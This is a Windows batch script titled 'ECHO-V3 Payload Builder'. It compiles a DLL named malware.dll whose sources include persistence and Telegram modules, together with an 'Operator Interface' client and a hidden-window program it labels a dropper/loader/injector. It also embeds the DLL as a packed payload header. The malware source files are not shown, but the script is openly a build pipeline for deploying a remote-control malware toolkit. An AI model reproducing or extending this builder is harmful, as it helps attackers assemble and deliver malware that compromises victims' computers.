@echo off
cls
title ECHO-V3 Builder
color 0A

echo.
echo  ==========================================
echo         ECHO-V3 - Payload Builder
echo  ==========================================
echo.

set DLL_NAME=malware.dll
set CLIENT_NAME=client.exe
set INJECTOR_NAME=loader.exe
set PACKED_HEADER=packed.h

echo [1/4] Compiling Server DLL...
echo.

g++ -shared -o %DLL_NAME% server.cpp lib/crypto.cpp lib/persist.cpp lib/telegram.cpp -I. -lws2_32 -lwsock32 -lgdi32 -luser32 -lwininet -static-libgcc -static-libstdc++ -O2 -s -std=c++11

if %errorlevel% equ 0 (
    echo   [ok] %DLL_NAME% compiled successfully!
) else (
    echo   [error] Failed to compile %DLL_NAME%
    goto :error
)

echo.
echo [2/4] Compiling Client...
echo.

g++ -o %CLIENT_NAME% client.cpp lib/crypto.cpp -I. -lws2_32 -static-libgcc -static-libstdc++ -O2 -s -std=c++11

if %errorlevel% equ 0 (
    echo   [ok] %CLIENT_NAME% compiled successfully!
) else (
    echo   [error] Failed to compile %CLIENT_NAME%
    goto :error
)

echo.
echo [3/4] Packing DLL to Header...
echo.

if exist %PACKED_HEADER% del %PACKED_HEADER%
python pack.py %DLL_NAME% %PACKED_HEADER%

if %errorlevel% equ 0 (
    echo   [ok] %DLL_NAME% packed to %PACKED_HEADER%!
) else (
    echo   [error] Failed to pack DLL
    goto :error
)

echo.
echo [4/4] Compiling Loader/Injector...
echo.

g++ -o %INJECTOR_NAME% loader.cpp -lws2_32 -liphlpapi -lwininet -lole32 -luuid -lshell32 -ladvapi32 -static-libgcc -static-libstdc++ -O2 -s -mwindows -std=c++11

if %errorlevel% equ 0 (
    echo   [ok] %INJECTOR_NAME% compiled successfully!
) else (
    echo   [error] Failed to compile %INJECTOR_NAME%
    goto :error
)

echo.
echo ================================================
echo                  BUILD SUMMARY
echo ================================================
echo.
echo   [ok] %DLL_NAME%         - Server Backend (DLL)
echo   [ok] %CLIENT_NAME%      - Operator Interface
echo   [ok] %PACKED_HEADER%    - Embedded Payload Header
echo   [ok] %INJECTOR_NAME%    - Dropper / Loader
echo.
goto :eof

:error
echo.
echo  Build failed. Check compiler output above.
pause
exit /b 1